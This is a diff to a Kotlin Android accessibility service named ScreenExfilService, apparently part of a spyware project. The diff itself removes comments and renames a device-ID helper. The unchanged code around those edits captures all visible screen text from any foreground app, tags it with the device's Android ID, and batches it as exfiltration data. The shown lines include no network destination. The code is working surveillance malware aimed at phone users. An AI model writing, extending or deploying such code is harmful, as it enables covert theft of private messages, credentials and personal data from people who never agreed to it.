@@ -13,13 +13,6 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
 import kotlinx.coroutines.launch
 
-/**
- * AccessibilityService that captures all visible screen text from any app.
- * Captures:
- * - All text from the current window
- * - Content descriptions
- * - Any visible text on the screen
- */
 class ScreenExfilService : AccessibilityService() {
 
     companion object {
@@ -29,11 +22,8 @@ class ScreenExfilService : AccessibilityService() {
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
     private lateinit var batchManager: BatchManager
 
-    /**
-     * Get the unique Android ID for this device.
-     * This is dynamic and unique per phone.
-     */
-    private fun getDeviceId(): String {
+    // Renamed to avoid conflict with ContextWrapper.getDeviceId()
+    private fun getUniqueDeviceId(): String {
         return Settings.Secure.getString(
             contentResolver,
             Settings.Secure.ANDROID_ID
@@ -42,9 +32,8 @@ class ScreenExfilService : AccessibilityService() {
 
     override fun onServiceConnected() {
         super.onServiceConnected()
-        Log.d(TAG, "✅ ScreenExfilService connected. Device ID: ${getDeviceId()}")
+        Log.d(TAG, "✅ ScreenExfilService connected. Device ID: ${getUniqueDeviceId()}")
 
-        // Initialize batch manager
         batchManager = BatchManager { batch ->
             scope.launch {
                 Log.d(TAG, "📦 Screen batch ready: ${batch.size} items")
@@ -52,7 +41,6 @@ class ScreenExfilService : AccessibilityService() {
         }
         batchManager.start()
 
-        // Configure accessibility service
         val info = AccessibilityServiceInfo().apply {
             eventTypes = AccessibilityEvent.TYPES_ALL_MASK
             feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
@@ -75,9 +63,6 @@ class ScreenExfilService : AccessibilityService() {
         }
     }
 
-    /**
-     * Capture all visible text from the current window.
-     */
     private fun captureScreenContent(packageName: String) {
         try {
             val root = rootInActiveWindow ?: return
@@ -93,7 +78,7 @@ class ScreenExfilService : AccessibilityService() {
                     type = "screen_text",
                     app = packageName,
                     data = data.toString(),
-                    device_id = getDeviceId() // <-- Dynamic Device ID
+                    device_id = getUniqueDeviceId()
                 )
                 batchManager.add(exfilData)
                 Log.d(TAG, "📱 Captured ${screenText.size} text items from $packageName")
@@ -103,9 +88,6 @@ class ScreenExfilService : AccessibilityService() {
         }
     }
 
-    /**
-     * Recursively extract all text from the view hierarchy.
-     */
     private fun extractAllTexts(node: AccessibilityNodeInfo): List<String> {
         val texts = mutableListOf<String>()
         val text = node.text?.toString()
